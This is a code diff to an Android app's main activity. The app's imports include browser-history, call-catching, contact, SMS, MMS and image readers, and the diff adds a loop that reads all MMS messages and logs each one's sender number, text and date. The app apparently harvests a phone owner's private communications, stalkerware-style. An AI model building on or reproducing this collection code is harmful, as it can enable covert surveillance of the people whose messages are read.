@@ -6,13 +6,17 @@ import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 
 import android.os.Bundle;
+import android.util.Log;
 
+import com.postal.omniscient.postal.adapter.AdapterData;
 import com.postal.omniscient.postal.browser.history.BrowserHistory;
 import com.postal.omniscient.postal.catchPhone.Call.TService;
 import com.postal.omniscient.postal.reader.contact.ReadContacts;
+import com.postal.omniscient.postal.reader.mms.ReadMms;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
 import com.postal.omniscient.postal.reader.image.AllImages;
 
+import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
 
@@ -34,7 +38,7 @@ public class MainActivity extends AppCompatActivity {
         ReadSms ob = new ReadSms(getContentResolver());
         String uri_send_sms = "content://sms/sent";
         String uri_inbox_sms = "content://sms/inbox";
-        ob.massAllSMS(uri_send_sms, uri_inbox_sms); // SMS'ki
+//        ob.massAllSMS(uri_send_sms, uri_inbox_sms); // SMS'ki
 
 
 
@@ -52,6 +56,18 @@ public class MainActivity extends AppCompatActivity {
         //BROWSER
         BrowserHistory br_h = new BrowserHistory(getContentResolver());
 //        br_h.getBrowserHist();
+
+        //MMS
+        ReadMms mms = new ReadMms(getContentResolver());
+        Long buf_date;
+        for(AdapterData buf : mms.massAllMms()){
+            Log.i(Msg, "Id : "+buf.getId());
+            Log.i(Msg, "Phone : "+buf.getAddress());
+            Log.i(Msg, "Text : "+buf.getMsg());
+            buf_date = Long.parseLong(buf.getTime());
+            Log.i(Msg, "date : " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
+                    .format(buf_date*1000));
+        }
 
 
 //        PhoneCall phoneCall = new PhoneCall();
